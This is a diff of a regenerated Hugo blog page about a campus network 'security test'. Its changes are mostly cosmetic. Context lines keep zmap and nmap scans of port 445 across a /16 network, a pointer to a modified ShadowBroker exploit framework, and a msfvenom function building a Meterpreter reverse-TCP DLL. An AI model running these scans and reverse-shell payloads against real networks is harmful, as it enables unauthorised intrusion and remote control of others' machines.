@@ -14,7 +14,7 @@
 <meta property='og:site_name' content='wrfly&#39;s blog'>
 <meta property='og:type' content='article'><meta property='article:section' content='Posts'><meta property='article:tag' content='daily'><meta property='article:published_time' content='2017-04-18T00:00:00Z'/><meta property='article:modified_time' content='2017-04-18T00:00:00Z'/><meta name='twitter:card' content='summary'>
 
-<meta name="generator" content="Hugo 0.40.1" />
+<meta name="generator" content="Hugo 0.52" />
 
   <title>校内网安全测试 • wrfly&#39;s blog</title>
   <link rel='canonical' href='https://wrfly.kfd.me/posts/%E6%A0%A1%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/'>
@@ -22,12 +22,16 @@
   
   <link rel='icon' href='/favicon.svg'>
 <link rel='stylesheet' href='/assets/css/main.c54db339.css'>
-<script>
-window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
-ga('create', 'UA-62244864-7', 'auto');
-ga('send', 'pageview');
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-62244864-7', 'auto');
+	
+	ga('send', 'pageview');
+}
 </script>
-<script async src='//www.google-analytics.com/analytics.js'></script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
 
 </head>
 
@@ -147,15 +151,15 @@ ga('send', 'pageview');
 <p>我还把shadowbroker的fb框架改了改，可以直接跑script脚本了：<a href="https://github.com/wrfly/shadowbroker-auto" target="_blank">https://github.com/wrfly/shadowbroker-auto</a></p>
 
 <p>然后用到的一些扫描命令，在这里记一下：</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#zmap
-</span><span style="color:#75715e"></span>docker run --privileged --rm -ti -v <span style="color:#e6db74">`</span>pwd<span style="color:#e6db74">`</span>:/tmp dominik/zmap -p <span style="color:#ae81ff">445</span> <span style="color:#ae81ff">10</span>.170.0.0/16 -o /tmp/result
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#zmap</span>
+docker run --privileged --rm -ti -v <span style="color:#e6db74">`</span>pwd<span style="color:#e6db74">`</span>:/tmp dominik/zmap -p <span style="color:#ae81ff">445</span> <span style="color:#ae81ff">10</span>.170.0.0/16 -o /tmp/result
 
-<span style="color:#75715e">#nmap
-</span><span style="color:#75715e"></span>nmap --script smb-os-discovery.nse -p445 -iL result 
+<span style="color:#75715e">#nmap</span>
+nmap --script smb-os-discovery.nse -p445 -iL result 
 sudo nmap -O --osscan-guess -Pn -T4 -p <span style="color:#ae81ff">445</span> -iL result -n -oG out
 
-<span style="color:#75715e">#msg窗口
-</span><span style="color:#75715e"></span>msg.exe * <span style="color:#e6db74">&#34;Your System is Vulnerable. Upgrade Your System to Windows 8+, or Turn On Your Fire Wall.&#34;</span></code></pre></div>
+<span style="color:#75715e">#msg窗口</span>
+msg.exe * <span style="color:#e6db74">&#34;Your System is Vulnerable. Upgrade Your System to Windows 8+, or Turn On Your Fire Wall.&#34;</span></code></pre></div>
 <p>一个小的function:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">generate_msfvenom <span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
 	msfvenom -p windows/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>$1 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">8888</span> -f dll &gt; go.dll
@@ -203,15 +207,14 @@ sudo nmap -O --osscan-guess -Pn -T4 -p <span style="color:#ae81ff">445</span> -i
     
 <footer class='entry-footer-container'>
   <div class='entry-footer'>
-  <div class='tags'>
-  <span class='taxonomyTerm-icon'><svg class='icon' viewbox='0 0 24 24' stroke-linecap='round' stroke-linejoin='round' stroke-width='2' aria-hidden='true'>
+  <div class='tags'><svg class='icon' viewbox='0 0 24 24' stroke-linecap='round' stroke-linejoin='round' stroke-width='2' aria-hidden='true'>
   
   <path d="M20.59,13.41l-7.17,7.17a2,2,0,0,1-2.83,0L2,12V2H12l8.59,8.59A2,2,0,0,1,20.59,13.41Z"/>
   <line x1="7" y1="7" x2="7" y2="7"/>
   
 </svg>
-</span>
-  <span class='screen-reader'>Tags: </span><a class='tag' href='/tags/daily'>Daily</a></div>
+<span class='screen-reader-text'>Tags: </span></div>
+
 
   </div>
 </footer>
@@ -246,7 +249,7 @@ sudo nmap -O --osscan-guess -Pn -T4 -p <span style="color:#ae81ff">445</span> -i
   
 <div class='comments-container'>
   <div id="disqus_thread"></div>
-<script>
+<script type="application/javascript">
     var disqus_config = function () {
     
     
